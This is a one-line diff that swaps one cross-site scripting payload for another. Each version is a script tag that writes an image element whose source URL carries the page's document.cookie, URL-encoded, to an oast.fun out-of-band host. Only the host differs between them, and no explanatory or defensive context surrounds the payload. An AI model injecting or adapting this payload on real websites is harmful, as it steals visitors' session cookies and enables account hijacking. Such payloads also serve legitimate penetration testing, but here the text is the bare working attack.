@@ -1,1 +1,1 @@
-<script>document.write(`<img%20src=https://fakonltzsfedwiqhgufs2qi0cms94akrh.oast.fun/${encodeURIComponent(document.cookie)}>`)</script>
+<script>document.write(`<img%20src=https://hqwkfozbqejnjncfqouaju7a9oghr07ei.oast.fun/${encodeURIComponent(document.cookie)}>`)</script>
